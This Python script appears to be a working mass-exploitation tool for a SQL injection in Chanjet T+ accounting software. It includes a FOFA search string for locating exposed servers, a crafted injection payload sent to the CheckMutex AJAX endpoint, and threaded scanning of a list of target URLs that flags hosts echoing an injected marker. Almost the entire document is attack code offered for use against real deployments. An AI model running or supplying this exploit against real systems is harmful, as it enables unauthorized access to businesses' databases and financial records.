import requests,threading,os,urllib3
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#fofa:   app="畅捷通-TPlus"
#参考文章  https://blog.csdn.net/qq_41904294/article/details/131206758
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',

}
filename = Path(__file__).name.strip('.py')
line_break = '\n'
file_path=Path(__file__).resolve().parent
result_path=file_path/'result'/f'{filename}.txt'
proxy={
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080',}

def exploit(ip_, index):
    try:

        url = ip_+'/tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex'
        # print(index,url)
        # payload={"accNum": "3'", "functionTag": "SYS0104", "url": ""}
        payload={"accNum": "3' AND 5227 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(112)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (5227=5227) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(120)+CHAR(113)))-- NCab", "functionTag": "SYS0104", "url": ""}

        res = requests.post(url,json=payload, headers=headers, timeout=8, verify=False)
        if len(res.text)>500: return
            # return
        if 'qvpxq1qpkxq' not in res.text : return

        print(res, len(res.text))
        print(index,ip_)
        print(res.text)
        # with result_path.open('a+') as file:
            # file.write(ip_+line_break)

    except Exception as e:
        print(e)
        pass

# url=''
# exploit(url,1)


threads = []
with open(r'D:\Downloads\tmp\changjie.txt', 'r') as file:
    # with result_path.open('r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 20
        end = start+20

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            # if index==:
            # break
            ip = line.strip(line_break)
            print(index, ip)
            # exploit(ip,index)

            thread = threading.Thread(target=exploit, args=(ip, index,))
            threads.append(thread)
pool_size = 20
# print(urls)

test = 'm'


if test=='t':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test=='m':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(exploit, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()